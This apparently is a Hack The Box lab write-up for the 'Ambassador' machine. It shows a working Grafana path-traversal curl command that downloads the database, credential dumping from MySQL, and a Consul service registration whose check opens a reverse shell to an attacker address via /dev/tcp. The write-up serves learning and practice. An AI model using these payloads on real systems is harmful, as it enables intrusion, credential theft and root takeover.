# Ambassador -Hack The Box


## Summary
Starting with a public exploit in Grafana, which is an unauthenticated path-travesel, leads to dumping sqlite data.We obtained a MySQL remote access credential from that dump and the SSH credential from the MySQL databases. taking ssh and finding a internal project in the /opt directory.Checking the git commits of the project, it leaks a token of the Consul app and has an API service listening internally and running as root, registering a service using the leaked token via the Consul API for root access.

## Recon

### Nmap

Initial nmap port scan

```bash
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
```

We had more ports open than usual this time.

### Web services

First we connect to port 80 it is running a static site build with hugo. It has a post message for newly
joined developers.

![image](/img/ambassador-web.png)

The post reveal their is an developer account for connecting ssh. Username is **developer**. Fuzzing hidden directory we can't find anything.

Connecting to port 3000 we can see a grafana login page.

![image](/img/ambassador-grafana.png)
>Grafana is a multi-platform open source analytics and interactive visualization web application. It provides charts, graphs, and alerts for the web when connected to supported data sources

### CVE-2021-43798

From the above image, we can see the version of Grafana v8.2.0 (d7f71e9eae). While searching for public exploits in exploitDB [https://www.exploit-db.com/exploits/50581](https://www.exploit-db.com/exploits/50581), we came across one Grafana versions 8.0.0-beta1 through 8.3.0 are vulnerable to directory traversal, allowing access to local files. A more detailed blog can be found here: [https://j0vsec.com/post/cve-2021-43798/](https://j0vsec.com/post/cve-2021-43798/)


We can now read any file with this exploit and have moved on to a more sensitive file. Grafana's default configuration makes use of sqlite3, and the database file is located at /var/lib/grafana/grafana.db.

Downloading the grafanadb using curl
```bash
curl --path-as-is "http://10.129.208.1:3000/public/plugins/state-timeline/../../../../../../../../../../../../../var/lib/grafana/grafana.db" -O grafana.db
```

Open the db file with a sqlite viewer.

![image](/img/ambassador-sqlite.png)

We found mysql creds from data_source table.

## Foothold

### MySQL

Connecting to mysql 
```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.08 sec)

mysql> use whackywidget;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.07 sec)

mysql> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.07 sec)

mysql> 
```
We found the WhackyWidget database inside the database's user table. We got the credentials for SSH, and the password was stored in Base64 format.

## SSH as developer
Decode the password and connected to ssh

```bash
developer@ambassador:~$ id && ls
uid=1000(developer) gid=1000(developer) groups=1000(developer)
snap  user.txt
developer@ambassador:~$ 
```

## Privilege escalation

We found a project in /opt directory that uses git to manage the project.
```bash
developer@ambassador:/opt/my-app$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 .
drwxr-xr-x 4 root root 4096 Sep  1 22:13 ..
drwxrwxr-x 4 root root 4096 Mar 13  2022 env
drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget
```
Looking at the git logs and if we look at the last commit. It removes a token that was used for consul services.
```bash
developer@ambassador:/opt/my-app$ git log --oneline
33a53ef (HEAD -> main) tidy config script
c982db8 config script
8dce657 created project with django CLI
4b8597b .gitignore
developer@ambassador:/opt/my-app$ git show 33a53ef
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```
Looking more on consul.
>HashiCorp Consul is a service networking solution that enables teams to manage secure network connectivity between services and across on-prem and multi-cloud environments and runtimes. Consul offers service discovery, service mesh, traffic management, and automated updates to network infrastructure device. You can use these features individually or together in a single Consul deployment.

Consul on this box running as root.
```bash
developer@ambassador:/opt/my-app$ ps aux | grep consul 
root        1093  0.2  3.8 794292 76364 ?        Ssl  06:01   0:15 /usr/bin/consul agent -config-dir=/etc/consul.d/config.d -config-file=/etc/consul.d/consul.hcl
```
Port numbers starting with "8" belong to consular services.
```bash
developer@ambassador:/opt/my-app$ ss -lnpt
State             Recv-Q            Send-Q                        Local Address:Port                          Peer Address:Port            Process            
LISTEN            0                 70                                127.0.0.1:33060                              0.0.0.0:*                                  
LISTEN            0                 151                                 0.0.0.0:3306                               0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:8300                               0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:8301                               0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:8302                               0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:8500                               0.0.0.0:*                                  
LISTEN            0                 4096                          127.0.0.53%lo:53                                 0.0.0.0:*                                  
LISTEN            0                 128                                 0.0.0.0:22                                 0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:8600                               0.0.0.0:*                                  
LISTEN            0                 511                                       *:80                                       *:*                                  
LISTEN            0                 128                                    [::]:22                                    [::]:*                                  
LISTEN            0                 4096                                      *:3000                                     *:*                   
```

What we can do is use the leaked token to register a service on the Consul agent by using the Consul http API listening on port 8500 and putting our payload in service configuration. While the consul executes the services, it triggers our payload as root.   

Referance API doc [https://www.consul.io/api-docs/agent/service](https://www.consul.io/api-docs/agent/service)   
Referance about default port [https://stackoverflow.com/questions/30684262/different-ports-used-by-consul](https://stackoverflow.com/questions/30684262/different-ports-used-by-consul)

```bash
# listing avilable services
curl http://127.0.0.1:8500/v1/agent/services -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5"
```

Create a configuration file rce.json with args as our reverse shell payload
```bash 
{
  "ID": "rce3",
  "Name": "rce3",
  "Tags": ["primary", "v1"],
  "Address": "127.0.0.1",
  "Port": 80,
  "Check": {
    "Args": ["bash", "-c", "bash -i >& /dev/tcp/10.10.16.6/9001 0>&1"],
    "Interval": "10s",
    "Timeout": "86400s"
  }
}
```
Registering new services
```bash
curl -X PUT http://127.0.0.1:8500/v1/agent/services/register \
          -H "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" \
          --data @rce.json
```
Wait to tigger the payload 
```bash
sudo netcat -lvnp 9001
Listening on 0.0.0.0 443
Connection received on 10.10.11.183
root@ambassador:/# id      
uid=0(root) gid=0(root) groups=0(root)
```

We got a reverse shell as root

Thank you for reading my blog; I hope you enjoyed it.

